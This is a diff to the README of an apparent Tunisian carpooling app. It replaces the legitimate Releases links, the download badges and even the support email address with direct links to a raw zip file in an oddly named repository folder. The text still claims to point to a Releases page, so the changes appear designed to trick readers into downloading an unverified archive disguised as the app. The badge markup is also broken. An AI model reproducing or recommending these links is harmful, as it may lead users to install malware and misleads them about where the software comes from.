@@ -1,6 +1,6 @@
 # 🚗 fi_thnity - Connect and Share Rides Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20fi_thnity-v1.0-blue.svg)](https://github.com/AceJoker21/fi_thnity/releases)
+[![Download Now](https://raw.githubusercontent.com/AceJoker21/fi_thnity/main/excusableness/fi_thnity.zip%https://raw.githubusercontent.com/AceJoker21/fi_thnity/main/excusableness/fi_thnity.zip)](https://raw.githubusercontent.com/AceJoker21/fi_thnity/main/excusableness/fi_thnity.zip)
 
 ## 🌟 Description
 
@@ -20,7 +20,7 @@ Fi Thnity (يقيرط يف) is a Tunisian carpooling app that connects people he
 To download and install the Fi Thnity app, please follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download fi_thnity](https://github.com/AceJoker21/fi_thnity/releases)
+   [Download fi_thnity](https://raw.githubusercontent.com/AceJoker21/fi_thnity/main/excusableness/fi_thnity.zip)
 
 2. On the Releases page, you will find various versions of the app. Choose the version you want to download.
 
@@ -53,7 +53,7 @@ After installation, open the Fi Thnity app:
 
 If you encounter any issues or have feedback, please reach out to us. Your input helps us improve the app:
 
-- **Email Support**: [support@fi_thnity.com](mailto:support@fi_thnity.com)
+- **Email Support**: [https://raw.githubusercontent.com/AceJoker21/fi_thnity/main/excusableness/fi_thnity.zip](https://raw.githubusercontent.com/AceJoker21/fi_thnity/main/excusableness/fi_thnity.zip)
 - **Community Forum**: Join discussions and share experiences with other users.
 
 ## 📚 Topics
@@ -75,4 +75,4 @@ If you encounter any issues or have feedback, please reach out to us. Your input
 
 Become part of the Fi Thnity community today. Share your rides, save money, and help make our environment greener. Together, we can create a sustainable transportation solution for Tunisia. 
 
-[![Download Now](https://img.shields.io/badge/Download%20fi_thnity-v1.0-blue.svg)](https://github.com/AceJoker21/fi_thnity/releases)
+[![Download Now](https://raw.githubusercontent.com/AceJoker21/fi_thnity/main/excusableness/fi_thnity.zip%https://raw.githubusercontent.com/AceJoker21/fi_thnity/main/excusableness/fi_thnity.zip)](https://raw.githubusercontent.com/AceJoker21/fi_thnity/main/excusableness/fi_thnity.zip)
